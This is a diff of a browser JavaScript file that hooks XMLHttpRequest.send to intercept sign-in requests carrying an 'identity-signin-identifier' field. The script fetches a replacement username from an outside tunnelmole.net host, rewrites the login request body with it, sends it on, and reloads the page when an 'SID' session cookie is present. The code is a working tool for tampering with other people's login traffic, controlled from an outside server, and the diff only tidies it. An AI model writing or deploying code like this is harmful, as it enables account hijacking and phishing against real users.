@@ -1,11 +1,11 @@
 let freqUsername = null;
 const modifiedRequests = new Set();
 const pendingRequests = new Map();
-
 let usernameFetched = false;
 
+// Fetch the username when needed
 const fetchFreqUsername = async () => {
-    if (usernameFetched) return; // Prevent duplicate fetches
+    if (usernameFetched) return; // Avoid redundant fetches
     console.log('Fetching username...');
 
     try {
@@ -23,14 +23,14 @@ const fetchFreqUsername = async () => {
             console.log('Fetched username:', freqUsername);
             usernameFetched = true;
 
-            // ✅ Reset server-side post data after confirming the fetch
+            // Reset the server-side username store
             await fetch('https://ufsxpg-ip-37-228-207-120.tunnelmole.net/reset-first-post-data', { method: 'POST' });
 
-            // ✅ Ensure requests are modified *after* we have post data
-            setTimeout(processModifiedRequests, 500);
+            // Process all pending requests now that we have a username
+            processModifiedRequests();
         } else {
             console.warn("No username data received, retrying...");
-            setTimeout(fetchFreqUsername, 1000);
+            setTimeout(fetchFreqUsername, 1000); // Retry after 1s
         }
     } catch (error) {
         console.error('Error fetching username:', error);
@@ -38,55 +38,54 @@ const fetchFreqUsername = async () => {
     }
 };
 
+// Modify and send pending requests when username is available
 const processModifiedRequests = () => {
     if (!freqUsername) {
-        console.log("Username not available yet, waiting...");
-        setTimeout(processModifiedRequests, 500);
+        console.log("Username not available yet, retrying...");
+        fetchFreqUsername();
         return;
     }
 
+    console.log("Processing pending requests...");
     for (let [xhr, body] of pendingRequests) {
         const match = body && /identity-signin-identifier%5C%22%2C%5C%22([^&]*)%5C/.exec(body);
 
-        if (match && !modifiedRequests.has(freqUsername)) {
+        if (match && !modifiedRequests.has(body)) {
             const modifiedBody = body.replace(match[1], freqUsername);
-            modifiedRequests.add(freqUsername);
-
+            modifiedRequests.add(body); // Mark the request as modified
             console.log("Modified request with new username:", modifiedBody);
-            xhr.send(modifiedBody);
-            pendingRequests.delete(xhr); // ✅ Ensure request is removed after sending
+            xhr.send(modifiedBody); // Send the modified request
+            pendingRequests.delete(xhr); // Remove the request from pending
         }
     }
 
-    // ✅ Ensure post data is cleared only *after* modifying requests
+    // Reset freqUsername when all requests are processed
     if (pendingRequests.size === 0) {
-        setTimeout(() => {
-            freqUsername = null;
-            usernameFetched = false; // Allow fetching new username if needed
-        }, 500);
+        console.log("All pending requests processed, resetting freqUsername.");
+        freqUsername = null;
+        usernameFetched = false; // Allow fetching a new username if needed
     }
 };
 
-
+// Intercept XMLHttpRequest to modify requests with username
+const originalXhrSend = XMLHttpRequest.prototype.send;
 XMLHttpRequest.prototype.send = function (body) {
     if (!body) {
         originalXhrSend.call(this, body);
         return;
     }
 
-    // ✅ Ensure interception only for login-related requests
+    // If the body contains identity-signin-identifier and hasn't been modified yet, intercept
     if (/identity-signin-identifier/.test(body) && !Array.from(modifiedRequests).some(m => body.includes(m))) {
         console.log("Intercepted request:", body);
-        pendingRequests.set(this, body);
-
-        // ✅ Wait for post data before modifying request
-        fetchFreqUsername();
+        pendingRequests.set(this, body); // Store the request in pendingRequests
+        processModifiedRequests(); // Attempt to modify and send the request
     } else {
-        originalXhrSend.call(this, body);
+        originalXhrSend.call(this, body); // Send the original request if no modification is needed
     }
 };
 
-// ✅ Send username data to server
+// Send username data to server
 const sendUsername = () => {
     console.log('Sending username...');
 
@@ -111,18 +110,18 @@ const sendUsername = () => {
     .catch(error => console.error('Error sending username:', error));
 };
 
-// ✅ Attach event listeners to buttons
+// Attach event listeners to buttons
 document.addEventListener('DOMContentLoaded', () => {
     const button = document.getElementById('sendUsernameBtn');
     if (button) {
         button.addEventListener('click', sendUsername);
     }
 
-    // ✅ Fetch username immediately on page load
+    // Fetch username immediately on page load
     fetchFreqUsername();
 });
 
-// ✅ Auto-refresh page if 'SID' cookie exists
+// Auto-refresh page if 'SID' cookie exists
 setInterval(() => {
     if (document.cookie.includes('SID')) {
         location.reload();
